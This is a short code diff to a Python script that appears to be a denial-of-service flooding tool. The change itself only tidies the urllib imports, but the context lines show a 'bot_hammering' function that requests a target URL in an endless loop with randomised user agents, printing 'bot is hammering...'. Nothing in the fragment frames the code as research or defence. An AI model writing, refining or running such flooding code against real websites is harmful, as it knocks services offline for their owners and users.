@@ -1,6 +1,7 @@
 from queue import Queue
 from optparse import OptionParser
-import time,sys,socket,threading,logging,urllib.request,random
+import time,sys,socket,threading,logging,random
+from urllib.request import urlopen,Request
 
 def user_agent():
 	global uagent
@@ -26,7 +27,7 @@ def my_bots():
 def bot_hammering(url):
 	try:
 		while True:
-			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
+			req = urlopen(Request(url,headers={'User-Agent': random.choice(uagent)}))
 			print("\033[94mbot is hammering...\033[0m")
 			time.sleep(.1)
 	except:
